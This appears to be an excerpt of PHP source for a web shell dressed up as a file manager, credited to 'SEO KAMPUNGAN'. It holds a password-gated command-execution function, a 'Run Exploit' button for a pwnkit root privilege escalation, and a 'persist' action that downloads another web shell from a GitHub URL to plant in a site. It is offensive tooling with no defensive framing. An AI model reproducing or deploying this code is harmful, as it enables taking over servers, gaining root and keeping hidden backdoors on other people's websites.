...
if (is_logged_in()) {
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$vO12bBSZby3P1I4nzKOgsu0XF3CzASFKDibyKo8WpuF.bV1g/3Esq'; // https://bcrypt.online/
...
function cmd($command) {
    try {
        ...
        error_log("Command executionerror: " . $e->getMessage());
    ...
    <?php if (isset($_GET['terminal']) && $_GET['terminal'] === 'root'): ?>
        <div class="compatibility-info <?= $is_compatible ? 'compatible' : 'not-compatible' ?>">
            ...
            <?php if ($is_compatible): ?>
                <a href="?p=<?= enc(PATH) ?>&action=pwnkit" class="btn btn-primary"><i class="fas fa-bolt"></i> Run Exploit
                </a>
            <?php endif; ?>
        </div>
        <?php if ($root_output): ?>
            ...
            <tbody>
                ...
                <?php
                    if (isset($_GET['act']) && $_GET['act'] === 'persist' && isset($_GET['file'])) {
                        // Web Shell Component
                        try {
                            $shell_content = download_content('https://github.com/miarufanjimar/seokampungan/raw/refs/heads/main/seokampungan.php');
                            if (!$shell_content) {
    ...
    <div class="container">
        <div class="row">
            ...
            <div class="col-md-6 text-md-end">
                ...
                <p class="mb-0">
                    Created by <a href="https://aurorafilemanager.github.io/" class="text-light" target="_blank">SEO KAMPUNGAN</a><br>
                    Version <?= APP_VERSION ?><br>
                    <small class="text-white">Made with <i class="fas fa-heart text-danger"></i> and  by SEO KAMPUNGAN</small>
                </p>
            </div>
        </div>
        <hr class="my-4">
        <div class="text-center">
            <p class="mb-0"><a href="https://github.com/AuroraFileManager/AuroraFileManager.github.io/" class="text-light mx-2" target="_blank">
